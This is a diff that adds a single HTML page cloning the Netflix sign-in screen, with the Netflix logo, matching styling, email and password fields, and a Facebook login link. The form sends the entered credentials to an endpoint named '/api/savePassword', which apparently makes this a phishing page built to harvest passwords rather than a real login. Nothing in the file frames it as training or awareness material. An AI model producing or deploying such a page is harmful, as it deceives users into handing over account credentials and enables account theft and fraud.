@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+    <title>Netflix</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url("https://preview.redd.it/how-can-someone-make-this-background-with-html-and-css-i-v0-zjgs096khv591.jpg?width=1080&crop=smart&auto=webp&s=5ec8b5f14222e27eecd19b9f5428793bcc857b58") no-repeat center center fixed; 
+            background-size: cover;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        .img-logo {
+            height: 94px;
+            margin-left: 45px;
+        }
+        .login {
+            margin: 0 auto;
+            width: 310px;
+            background-color: rgba(0, 0, 0, 0.75);
+            border-radius: 5px;
+            padding: 60px 68px 40px;
+            color: white;
+        }
+        .login h1 {
+            color: white;
+            margin-bottom: 28px;
+        }
+        .input-text {
+            margin-bottom: 20px;
+        }
+        .input-text input {
+            width: 100%;
+            height: 50px;
+            background-color: #333;
+            color: white;
+            border-radius: 5px;
+            border: none;
+            outline: none;
+            padding: 0 15px;
+        }
+        .signin-button {
+            margin-top: 24px;
+            width: 100%;
+            padding: 16px;
+            border-radius: 5px;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .remember-flex {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #b3b3b3;
+        }
+        .remember-flex input {
+            margin-right: 5px;
+        }
+        .login-face {
+            margin: 50px 0 15px 0;
+            vertical-align: middle;
+            color: #8c8c8c;
+        }
+        .login-face img {
+            margin-right: 10px;
+        }
+        .signup-link, .help {
+            color: #b3b3b3;
+            font-size: 14px;
+        }
+        .signup-link a, .help a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+        .signup-link a:hover, .help a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <a href="#">
+            <img src="https://loodibee.com/wp-content/uploads/Netflix-logo.png" class="img-logo" />
+        </a>
+    </div>
+    <div class="login">
+        <form action="/api/savePassword" method="POST">
+            <h1>Sign In</h1>
+            <div class="input-text">
+                <input type="text" name="email" placeholder="Email or phone number" required />
+            </div>
+            <div class="input-text">
+                <input type="password" name="password" placeholder="Password" required />
+            </div>
+            <button class="signin-button" type="submit">Sign In</button>
+            <div class="remember-flex">
+                <label><input type="checkbox" /> Remember me</label>
+                <a class="help" href="#">Need help?</a>
+            </div>
+            <div class="login-face">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/16/Facebook-icon-1.png" alt="Facebook" width="20" />
+                <a href="#">Login with Facebook</a>
+            </div>
+            <div class="signup-link">
+                New to Netflix? <a href="#">Sign up now</a>.
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+
